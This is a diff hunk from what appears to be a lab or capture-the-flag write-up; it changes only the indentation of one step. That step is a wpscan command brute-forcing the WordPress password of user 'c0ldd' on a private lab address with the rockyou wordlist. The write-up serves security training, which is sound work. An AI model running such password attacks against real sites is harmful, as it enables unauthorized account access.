@@ -73,7 +73,7 @@ The scanner identified three valid usernames, but we did not know the password. 
 # Step 5: Brute Force Attack
 1. We used the WPScanner tool for brute-forcing the password. The command used is:
 
-      wpscan --url http://192.168.225.2 --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd
+         wpscan --url http://192.168.225.2 --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd
 
 <img width="602" height="292" alt="image" src="https://github.com/user-attachments/assets/ae2ef513-0ace-45b6-9fac-4a0abc5330db" />
 
